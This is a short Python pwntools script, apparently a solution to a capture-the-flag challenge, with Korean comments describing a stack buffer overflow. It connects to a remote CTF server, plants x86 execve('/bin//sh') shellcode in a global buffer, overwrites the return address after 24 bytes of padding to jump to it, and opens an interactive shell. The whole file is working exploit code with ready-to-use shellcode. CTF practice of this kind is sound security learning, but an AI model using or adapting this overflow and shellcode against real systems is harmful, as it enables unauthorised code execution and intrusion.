# -*- coding: utf-8 -*-
from pwn import * 

#p = process("./prob1")
p = remote("ctf.j0n9hyun.xyz",3003)
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# 입력은 두번받는다. 한번은 name이라는 전역변수에, 한번은 스택상에. 
# 스택상에 입력받는 위치는 0xffffd4d4 , eip 위치는 0xffffd4ec => 24바이트만큼 덮어주면 됨. 
# 전역변수 위치는 0x804a060 여기에 쉘코드를 넣어주자. 

payload = "a"*24 + p32(0x804a060)

p.sendlineafter("Name : ",shell)
p.sendlineafter("input : ",payload)

p.interactive()